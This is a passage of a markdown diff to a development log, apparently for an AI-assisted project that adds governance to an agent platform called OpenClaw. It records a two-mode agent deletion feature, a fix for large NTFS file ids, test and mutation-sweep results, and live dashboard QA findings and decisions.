+   popup. Neither option is pre-selected, and the full delete is styled as the dangerous one.
+2. **Files.** As OpenClaw does: moved to `.Trash` in the home folder of the account the
+   Gateway runs as. Nothing in the product restores them. No third "keep files" option.
+3. **Governance's own copies.** The full delete also removes the agent's dashboard
+   conversations and its unsent attachments; attachments a ledger entry names stay
+   (finding 211's rule).
+4. **Deleting an organisation** asks once, with the same two choices, for every agent.
+5. **After a list-only delete**, creating an agent under a name with leftovers adds a
+   clause to the creation notice saying what it inherited. With that shipped, finding 372
+   counts as fixed.
+6. **Who.** Whoever may delete today: the owning Administrator, or Root.
+7. **Refusals.** OpenClaw's own (the default agent, a reserved agent, one it no longer
+   lists, a database open in another process, and, found while finishing it, its
+   configuration-file guard) and a busy agent (a dashboard prompt running
+   or a live Gateway session) refuse with what to do next. Nothing stops the agent
+   automatically.
+8. **Finding 254's layout.** A full delete that would move a folder containing the
+   governance directory is refused; list-only stays available.
+
+**Code written and subsequently committed and pushed.**
+
+- `src/governance/agent-host-deletion.ts` (new): `HostDeletionMode`, the seam the Gateway
+  installs OpenClaw's delete into (`registerHostAgentDeleter`), `runFullHostDeletion` (the
+  no-Gateway, busy and governance-directory checks, then the deleter, with a remedy for
+  each refusal), `cleanUpGovernanceAfterFullDeletion`, `describeHostDeletion` (the ledger
+  clause, counts never paths), `detectHostLeftovers`, `governanceDirWithin`,
+  `plannedHostDeletionPaths`.
+- `src/gateway/governance-host-agent-deletion.ts` (new): `installGovernanceHostAgentDeleter`
+  runs `agentsHandlers["agents.delete"]` in-process with the live request context and
+  `deleteFiles: true`; `classifyHostDeleteRefusal` maps its wording to a code. Installed in
+  `src/gateway/server-runtime-state.ts` beside the kill switch's terminator.
+- `src/governance/agent-provisioning.ts`: `deprovisionAgent` takes `hostDeletion` (defaults to
+  `roster` at the function level, for callers that predate it); the full path runs
+  `runFullHostDeletion` before unregistering, then T55's clearing, then governance's own
+  clean-up, and the ledger clause; new result fields. `provisionAgent` detects and returns
+  `hostLeftovers` before the host creates anything.
+- `agent-conversation.ts` `forgetAgentConversations`; `attachment-store.ts`
+  `releaseUnsentAgentAttachments`; `active-sessions.ts` `activeSessionAgentIds`;
+  `organisation-deletion.ts` passes `hostDeletion` to every agent and names it in the
+  request entry.
+- Routes: `agents/deprovision` requires `hostDeletion` (`roster` or `full`) whenever
+  `deleteFromHost` is true, and returns the new fields; `organisation/delete` requires it;
+  `agents/provision` returns `hostLeftovers`.
+- Dashboard: `ui/src/components/confirm-dialog.ts` gains `showChoiceDialog` (shares the
+  confirm dialog's one-at-a-time guard); `ui/src/pages/governance/panels/agent-delete-choice.ts`
+  (new: `chooseHostDeletion`, `deletionNotice`, `leftoversClause`); the agent-registry and
+  organisation panels use it; `api.ts` and `api.agents.ts` types and calls;
+  `en-governance.ts` wording. The old `confirmDelete*` strings and the organisation's
+  `confirmMessage`, `confirmDetails` and `confirmAction` are removed, and with them the false
+  claim that deleting an agent deleted its workspace and transcripts.
+- Tests: `src/governance/agent-host-deletion.test.ts` (new, 9), `src/gateway/governance-host-agent-deletion.test.ts`
+  (new: end to end, refusal mapping, route validation), `ui/src/pages/governance/agent-delete-choice.test.ts`
+  (new, 8); `src/gateway/governance-organisation-delete.test.ts` updated (bodies carry
+  `hostDeletion`, plus a missing-choice case).
+
+**Resumed and finished (2026-09-15, a later session).** The paused work was checked before it
+was continued: the diff read file by file against the decision, and the cause confirmed on
+this machine. The repository folder's NTFS id is 56,294,995,342,267,356, above 2^53, while
+`src` and `%TEMP%` measured below it, so OpenClaw's delete refused whenever a folder it moved
+had a large id, not on every Windows folder. `C:\Users\kinan\.Trash` is still absent.
+
+- **Finding 373, fixed (upstream code).** `cleanupPathIdentity` keeps exact decimal strings
+  read from bigint `lstat`: in `prepareAgentDeleteCleanupPaths`, in `statAgentCleanupPath`
+  (beside `fs-safe`'s `root().stat`, which rounds with `Number()`), and in the deletion
+  journal (`src/state/agent-deletion-journal.ts`, `dev`/`ino` now `string | null`, parsed as
+  `^\d+$`). A rounded number is still refused. No reader for a journal written with numbers,
+  an accepted trade-off: a journal is open only between a deletion's start and finish, and
+  one written by an earlier build fails to parse rather than being misread. Two regression
+  tests in `agents-mutate.test.ts`, whose stat mock answers exactly only when asked for
+  bigint: NTFS-sized ids delete, and a folder replaced between preparation and the move by
+  one whose id differs only past 2^53 is kept. The journal round-trip fixture in
+  `agent-lifecycle-registry.test.ts` uses strings.
+- **Baseline proof for `agents-mutate.test.ts`.** 30 of its tests fail on Windows. The four
+  changed files were swapped for their committed versions (a restoring `trap`, hashes
+  checked), the file run, and the failing titles diffed: the same 30 at HEAD, all POSIX path
+  literals, none new.
+- **OpenClaw's configuration-file guard.** With 373 fixed, the end-to-end test met
+  `io.write-safety.ts`, which refuses a rewrite keeping under half of a file of 512 bytes or
+  more. Governance's list-only delete opts out of it; `agents.delete` cannot. Nothing changes
+  on that refusal (the roster is not written and the fence rolls back; OpenClaw saves the
+  rejected payload beside the config). `classifyHostDeleteRefusal` names it `config-rejected`,
+  whose remedy is the list-only delete; the first classification, `failed`, said to run the
+  delete again, which meets the same guard. A new end-to-end test drives it on a near-empty
+  configuration and asserts its precondition (`openclaw.json` of 512 bytes or more); the
+  full-delete test gains a bystander agent, as a real installation has, which keeps
+  everything; the test's scheduled-job stand-in is now transactional like the real service.
+- **Finding 374, fixed.** No dashboard file read `remedy`: `GovernanceApi.request` built its
+  error from `message` alone, and every panel shows that error. It now appends the remedy
+  (`ui/src/pages/governance/api.errors.test.ts`, two tests).
+- **Gaps closed in the tests.** Nothing proved that provisioning returns `hostLeftovers`
+  after a list-only delete, the half of C13 that makes 372 count as fixed; an end-to-end test
+  now does. The governance clean-up test did not check that another agent's conversation
+  survives; it does. The first past-2^53 test compared against a journal fixture, so a
+  mutation rounding both sides would have survived; it now prepares the deletion itself.
+- **Line count.** Production about +940 net (tracked +507/−123, new modules 557), tests about
+  +970; positive, for a capability Kinan decided on.
+
+**Verification after the build (2026-09-15), on the final tree.**
+
+- **Typechecks, all four 0:** core, UI, `test/tsconfig/tsconfig.core.test.json` and
+  `test/tsconfig/tsconfig.test.ui.json`. The core test typecheck first failed on two mock
+  signatures in the new `agents-mutate.test.ts` tests (an `options` parameter against the
+  mock's `(...args: unknown[])`); fixed and re-run to 0.
+- **Governance suite:** 3,169 passed, 21 skipped, 0 failed, in 192 files passed and 2 skipped
+  (3,123 in 187 files on 2026-09-14).
+- **Whole `ui/src` suite:** 8,221 passed, 5 failed, 137 skipped. The five are A10's, each
+  `object.stream is not a function`, in the model-setup and plugins pages.
+- **Browser project:** 199 passed in 22 files.
+- **`agents-mutate.test.ts` with the journal round trip:** 68 passed, 30 failed, the 30
+  identical by title to HEAD.
+- **Mutation sweep, 15 of 15 caught** (the script was session scratch and is not in the
+  repository): the identity rounded; preparation without bigint; the check reading
+  `fs-safe`'s rounded stat; the journal rejecting strings; the config guard unnamed; the busy
+  and governance-directory refusals removed; each route defaulting the choice; clean-up
+  reaching every agent's conversations, or every agent's attachments; sent attachments
+  released; `hostLeftovers` not returned; cancel deleting; the remedy dropped. **The first run
+  caught 14.** The cancel test asserted one microtask after _Keep this agent_ was pressed,
+  before the dialog's answer reached the panel, so it passed whatever the panel did with it;
+  it now waits for the answer, and the mutation is caught.
+- **Full lint gate** (raised cap) exit 0, about 31 minutes; plain `oxlint` and
+  `oxfmt --check` 0 over the one test edited after it.
+- **Not established:** OpenClaw's delete with files on the Linux VPS (T3) or through a live
+  Gateway, and a person pressing either deletion on a real screen (T47 rows 2.2.12–2.2.15).
+
+**Where the paused build stood, kept as recorded (every next step below is now done):**
+
+**Verified before the pause.** Core and UI typechecks 0 (run before the test files were written).
+Plain `oxlint` and `oxfmt --check` 0 over all 21 changed and new code and test files. The
+existing tests the change touches pass (dashboard 54; governance and Gateway 752). The new
+governance unit tests and the organisation route tests pass (33 across project runs); the
+new dashboard tests 8 of 8; in the Gateway file, the governance-directory refusal, the
+refusal mapping and the route validation pass.
+
+**Where it stopped: one failing test, and why.**
+`src/gateway/governance-host-agent-deletion.test.ts` › _"removes what the agent left, so a new
+agent of the same id starts with nothing"_ fails on Windows. Governance reports it
+correctly (`host-failed`; the agent stays registered and governed), and the cause is in
+OpenClaw: its own `agents.delete` throws **"cleanup path identity exceeds the safe integer
+range"**. `cleanupPathIdentity` in `src/gateway/server-methods/agents.ts` (about line 340)
+converts each folder's `stat.dev` and `stat.ino` to a JavaScript number and refuses when
+either is above 2^53, and NTFS file ids routinely are. **So OpenClaw's own delete with
+files appears not to work on Windows at all.** It is expected to work on the Linux VPS,
+where inode numbers are small, but **that is not verified**. Next steps, in order:
+
+1. **Confirm the cause:** print `stat.ino` for a folder on this machine, and check whether
+   upstream's own delete-with-files is tested on Windows (`src/commands/agents.delete.test.ts`,
+   `src/gateway/server-methods/agents-mutate.test.ts`).
+2. **Decide with Kinan:** (a) fix upstream's identity check to compare exact values
+   (bigint or string) rather than numbers, an upstream edit, which this project allows;
+   (b) run the end-to-end test on Linux only and state the Windows limitation; or (c) both.
+   **Recommended: (a)**, because development happens on Windows and the fence's purpose,
+   detecting a folder swapped before deletion, is kept by comparing exact values.
+3. **Finish verification:** the end-to-end test green; the test-tree typechecks
+   (`test/tsconfig/tsconfig.core.test.json`, `test/tsconfig/tsconfig.test.ui.json`); the
+   governance suite; the whole `ui/src` suite; the browser project; a mutation sweep of
+   the new protections (the governance-directory refusal, the busy refusal, the required
+   `hostDeletion` on both routes, clean-up scoped to one agent, sent attachments kept, the
+   leftovers clause, the popup's cancel); the full lint gate.
+4. **Finish the documents once green:** design §3.5.91 (written as in progress),
+   `GOVERNANCE.md`'s agent-deletion description and row 372 marked fixed, plain language
+   §5.118, `docs-notes/PERMISSION-SPEC.md` §8 (both routes take the choice), T47 rows for
+   both deletions, the leftovers warning and the refusals, `docs-notes/WRITING-GUIDE.md`'s
+   claims row "Deleting an agent removes everything it had", and the counts in
+   `mg/HANDOFF.md`, `mg/PROJECT-SUMMARY.md` and the sweep register (372 fixed: 372 found,
+   370 fixed, 2 open).
+
+**Two traps found on the way.**
+
+- **Inside a Vitest worker thread on Windows, `os.homedir()` returns the real user
+  profile** (`C:\Users\kinan`), even though the shared setup points HOME and USERPROFILE at
+  a per-worker temp home: a worker's `process.env` is not the native environment. OpenClaw's
+  trash is `os.homedir()/.Trash`, so a test running `agents.delete` with files would move
+  files into the real profile. The end-to-end test now points `os.homedir` at its own temp
+  home and refuses to delete unless that holds. **Checked afterwards: `C:\Users\kinan\.Trash`
+  does not exist; nothing was moved there.**
+- **Agent ids are unique across an installation**, so a governance test that seeds agents
+  in `beforeEach` needs fresh ids each time, or the second test fails with
+  `DuplicateAgentError`. And the dashboard test cancels any open dialog after each test,
+  because `showChoiceDialog` shares the confirm dialog's one-at-a-time guard.
+
+**Claims corrected on the way:** `docs-notes/WRITING-PERMISSIONS.md` §4 said `monitor`
+blocks nothing (every denial, the kill switch and registration still refuse); the stale
+comments in
+`policy-engine.ts` (a User switching their own agent into monitor) and in
+`scripts/governance-demo-rehearsal.mjs` (a test count) corrected. **Rewriting documents
+13–15 corrected more:** `mg/PROJECT-SUMMARY.md` §6 still said the fork "has never been
+deployed to a VPS" and was "not yet demonstrated", eleven and eight days after each
+stopped being true, and three headings in this file still called committed work
+uncommitted.
+
+**Verified on the tree with 369 and 370 fixed, before A12:**
+
+- **Mutation sweep, 8 of 8 caught**, each file restored and hash-checked: the live-session
+  toggle gated on `canStop` again; the escalation answer route checking registration only;
+  the held-decision refusal removed; the rule-request answer route checking registration
+  only; the time comparison ignored, once in the rule-request check and once in
+  `registrationPredates`; and two over-broad controls, each check made to refuse
+  everything, caught by the tests asserting that the current agent's questions stay
+  answerable.
+- **Governance suite** 3,116 passed, 21 skipped, 0 failed, in 186 files with 2 skipped. The
+  seventeen over 3,099 are the new tests, with the two gateway files counted under each of
+  their three Vitest projects.
+- **Whole `ui/src` suite** 8,204 passed, 5 failed, 137 skipped. The five are A10's, each
+  confirmed by its error (`object.stream is not a function`) rather than by the count.
+- **A bound, measured rather than filed:** `GET rule-requests` as Root, seeded at both
+  caps (1,000 rules, 500 pending requests, 50 agents), answered 200 with all 500 requests
+  in 34–43 ms over five reads. The probe was a scratch file and is not in the repository.
+
+**Verified on the final tree, A12 included:** §"A12" above.
+
+### The QA over 2026-09-11 to 15, driven live (2026-09-18)
+
+**Method.** An isolated Gateway on port 18823 — its own `OPENCLAW_STATE_DIR`,
+`OPENCLAW_GOVERNANCE_DIR` and **its own HOME**, so OpenClaw's trash could not reach the real
+profile — started from a rebuilt `dist`, and the dashboard driven through a browser. Root
+bootstrapped, two Administrators created, agents provisioned and deleted both ways, a core
+rule switched off and on, the kill switch engaged and released, the sign-in throttle tripped,
+and the organisation deleted last. **Every outcome was checked against `policy.json`,
+`agents.json`, the audit ledger and the file system, never against the screen alone.**
+
+**Confirmed working:** the first-run form (205); C13 in full — the two-option dialog and its
+four explanations, cancel, the list-only delete and its notice, the leftovers clause on the
+next creation (372), OpenClaw's own delete moving three folders to `.Trash` with real NTFS
+ids (373's fix, without which it refuses), the same question asked once for a whole
+organisation, and the ledger kept (49 entries) with every account gone; a refusal showing its
+remedy (374); a core rule off and back on with both ledger entries (367); A12's per-agent
+escalation, landing as `agentAsk: { scout: "off" }` and in the ledger; the kill switch asking
+first, naming the agent, locking and releasing; and the lockout stating the wait (368).
+
+**Two findings, both fixed.** **375**: the registry drew _Allow/Disallow Codex_ and _Remove…_
+on tier while the routes check ownership, so a second Administrator was offered both on
+another's agent. **376**: OpenClaw's delete leaves the agent's SQLite side files and reports
+success, so C13's promise that the next agent of the name "starts with nothing" was false;
+the promise is now honest and the residue is reported. Both are written up in
+`GOVERNANCE.md`, design §3.5.92 and plain language §5.119.
+
+**375's fix was wrong once, and only the page showed it.** Gating _Remove…_ left its `else`,
+the _Register_ button, on a registered agent, so a non-owner was offered registration. Every
+unit test still passed: they asserted what had gone, not what had appeared. The tests now
+assert the absence of _Register_ as well.
+
+**Not covered, and why.** Anything needing a model: a User's rule request through A11, the
+_Observe_ row (369), dashboard escalations (T68) and a task surviving its tab (T63) all need a
+running prompt, and the QA Gateway has no model connected. The service worker (346) was left
+to the pass that found it.
+
+**Verified on the final tree (2026-09-18/19).** Four typechecks 0. Governance suite 3,176 passed,
+21 skipped, 0 failed, in 192 files and 2 skipped; its first run failed 2 in
+`agent-registry-panel.test.ts`, whose sample agent carried no owner name, which the route always
+sends, and was corrected. Whole `ui/src` suite 8,227 passed, 5 failed (A10's five, by their error).
+Browser project 199 in 22 files. Full lint gate exit 0 with the raised cap. Mutations: 375's gate
+(always-true and always-false) and its Register branch, and 376's residue read, each caught by exactly
+the tests it should. Not re-run: the mutation sweep of C13 and the host suites, which nothing changed.
+
+**Two traps for §4.** A gateway started from `.claude/launch.json` with no configuration
+exits **78** immediately (_"Missing config. Run `openclaw setup` or set gateway.mode=local"_),
+and the preview pane reported it as started with no logs at all; write a minimal
+`openclaw.json` (a `gateway.mode: "local"`, a token, and one agent) into the QA state
+directory first. And **point HOME at the QA directory**: OpenClaw's trash is
+`os.homedir()/.Trash`, so a full delete driven live otherwise moves an agent's files into the
+real profile.
+
+### The live QA of 2026-09-19, with a model connected (findings 377–379, decision C15)
+
+**Asked by Kinan:** pick dashboard features, QA them by driving the dashboard live, and record
+what could not be done in the T47 plan. **Method.** The isolated Gateway of 2026-09-18 (now
+launch entry `governance-gateway-qa6`, port 18825, its own state, governance and home
+directories) with a model for the first time: qa-lab's mock OpenAI server (`qa-mock-openai-6`,
+port 44080), which scripts replies and tool calls. Root, two Administrators (adm1 owning agent
+`scout`, adm2 owning nothing), a User (usr1, assigned scout), a User with no agents (usr0) and a
+Viewer; usr1 and adm1 signed in at once on `localhost` and `127.0.0.1`, which keep separate
+cookies; adm2 and the Viewer through the same routes with `curl`. Every outcome read from
+`policy.json`, the request store, the ledger and the Gateway log. Kinan pressed _Always allow_
+on one card by accident; it had already expired, and nothing reached the Gateway.
+
+**Pressed and passed (T47 rows):** 3.1.1–3.1.2, 3.2.1 (reply), 3.2.4, 3.2.5, 3.2.9, 3.2.12–3.2.13,
+3.6.4 (as the Viewer, head matching `scripts/verify-ledger.mjs`), 6b.1–6b.4, 6c.1, 6c.2, 6c.4,
+6c.7, 6c.10, 6c.11, 6c.13, 6d.5, 6d.6, 6d.9, 6d.10, 6d.13, and Q1's never-pressed Approve,
+Reject and Verify chain integrity. **Also confirmed:** `monitor` records a miss as `ask` and
+lets it run (FIGURES F3), and a prompt refused for want of a slot is recorded first (F10).
+
+**Three findings, all fixed.** **377** (low, T60's code): every unanswered escalation left a false
+_"plugin approval follow-up reporting failed"_ warning, because the hook reported an outcome the
+Gateway accepts only after a decision; the hook now reports only decisions. **378** (low): the
+Viewer's Identity sentence promised "the rule requests queue in full"; reworded. **379** (low): a
+setting request could be filed for an agent governance never registered, and never approved;
+refused at filing, the list narrowed to registered agents, and the approval refusal's "deleted
+since" corrected. The registers carry each: `GOVERNANCE.md`, design §3.5.93, plain language
+§5.120. **Counts: 379 found, 377 fixed, 1 open (169).**
+
+**Decision C15, Kinan's.** A request filed by _Always allow_ or _Would allow_ says _requested by
+hitl-approval_, the label for a proposal no account authored, although since T68 the answer
+comes from a named account the ledger already records. **Recommended:** attribute it to that
+account when the answer came from a signed-in governance session; keep the label for chat runs.
+Not built, because it moves the request into that account's per-account queue capacity.
+
+**A measurement, not a finding.** The kill switch confirmed a dashboard task's stop in 2,170 ms
+and 2,760 ms (signal 1.3 ms and 6.8 ms) on a laptop whose Gateway logged event-loop stalls of up
+to 8.6 s. Requirement 7 is one second: re-measure on the VPS before Chapter 4 quotes a number.
+
+**Not done, and why** (also at the top of `docs-notes/T47-TEST-PLAN.md`): screenshots (no visible
+browser window); three machines; a real model; the streaming half of 3.2.1; attachments (3.2.3);
+chat channels; 2.2.14, 3.1.6–3.1.7, 3.2.14, 6b.5, 6c.5, 6c.6, 6c.8, 6c.12, 6d.3, 6d.4, 6d.7, 6d.8,
+6d.11, 6d.14–6d.16; and Linux (T3).
+
+**Traps** (in `mg/HANDOFF.md` §4): the dashboard does not poll approvals in a hidden tab, and the
+Claude browser pane's tabs report hidden; the e2e Vitest config's global setup rebuilds `dist`
+and, killed at its cap, left it half-built under a running Gateway; and
+`agent-tools.before-tool-call.e2e.test.ts` fails 6 tests on Windows at HEAD (POSIX paths).
+
+**Verified on the final tree (2026-09-19).** Four typechecks 0. Governance suite 3,187 passed, 21
+skipped, 1 failed in 196 files: the failure was `agent-setting-request.test.ts`'s page fixture, which
+loaded no agent registry and so met 379's registered-only list with nothing; given the registry entry
+the real page always loads, that file passes 12/12. Whole `ui/src` suite 8,229 passed, 6 failed: A10's
+five (by their error) and `app-host.test.ts`'s locale retry, which passed alone three times out of
+three. Browser project 199 in 22 files. `agent-tools.before-tool-call.e2e.test.ts` 95 passed, 6 failed,
+the same six as at HEAD by title; `agent-tools.before-tool-call.embedded-mode.test.ts` fails one test,
+the same with the committed `approval.ts` swapped in. Mutations: 377's condition, 378's sentence and
+379's route check were each red before their fix, and 379's registered filter, disabled, turned exactly
+its test red. Live: 377 (no report after a timeout), 378 (the new sentence) and 379 (refused at filing,
+the list without `main`) on the rebuilt Gateway. Full lint gate exit 0 with the raised cap.
+
+### C15 and A13 built (2026-09-19, at Kinan's word)
+
+**Asked by Kinan:** "go with your recommendation on C15 and build A13, then test them."
+
+**C15, built as recommended.** A rule request filed by answering an escalation now carries
+`answeredBy`, the governance account that answered, and names it in the queue (_"lina, answering an
+escalation"_), in its ledger entry's actor and in the decision's sentence. `requestedBy` keeps
+`hitl-approval`, so the queue budget (40 + 20 per account) and de-duplication are unchanged and a
+User's presses do not count against that User's own 20. _Would allow_ passes its session; _Always
+allow_ is filed in the agent's approval callback, whose type is public plugin API, so the approvals
+route notes the answerer under the approval's id before resolving it and the host runs the callback
+inside that id (`src/governance/approval-answerers.ts`, `AsyncLocalStorage`; the note is taken once,
+forgotten if the answer fails, bounded at 256 and 25 hours). Chat-run approvals keep the anonymous
+label. Files: `approval-answerers.ts`, `rule-requests.ts`, `policy-engine.ts`,
+`governance-dashboard-approvals.ts`, `governance-dashboard-oversight.ts`,
+`agent-tools.before-tool-call.approval.ts`, and on the page `account-panels.ts`,
+`api.rule-requests.ts`, `en-governance.ts`.
+
+**A13, built as the task below describes.** **Edit…** on a registered row for whoever
+`administersAgent` admits; a display-name field (the id stated as fixed); for Root, a picker of
+`agentOwners` and **Change owner**, confirmed first with who loses the agent; an owning
+Administrator is told to ask Root. `panels/agent-edit-controls.ts`, three draft fields in
+`agent-registry-panels.ts`, strings in `en-governance.ts`.
+
+**Tests, red first:** `escalation-request-author.test.ts` (new), additions to
+`governance-approvals.test.ts`, `governance-reregistered-agent-questions.test.ts`,
+`agent-tools.before-tool-call.e2e.test.ts` and `agent-setting-request.test.ts`, and
+`agent-edit-controls.test.ts` (new, nine tests). **Mutations: ten, all caught** by the test meant to
+catch each, every file restored with its hash checked.
+
+was stored with `answeredBy: usr1` (origin `hitl-approval` kept) and recorded against
+usr1, which also proves the note crossed from the route to the agent's callback in one process; a
+lapsed `vol` question answered _Would allow_ did the same; the queue read _"requested by usr1,
+answering an escalation"_, and rejecting one was recorded as _"rejected usr1's request"_. adm1
+renamed scout to "Scout Recon" (stored, recorded against adm1; the row caught up at the next
+refresh, the page's known lag); Root gave it to adm2 after a confirmation naming adm1, and usr1's
+assignment was revoked in the same act; afterwards adm2 was offered Edit…, Allow Codex and Remove…
+on it and adm1 nothing. **The build's last step timed out once under load** (`write-cli-startup-metadata`,
+"browser help" past 120 s); re-run alone it passed.
+
+### A13: rename and re-own an agent from the dashboard (added 2026-09-18, BUILT 2026-09-19)
 
 **Found by the live QA of 2026-09-18**, while checking which controls the registry draws against
 which routes check ownership. Not numbered as a finding, like A12, because nothing is wrong with
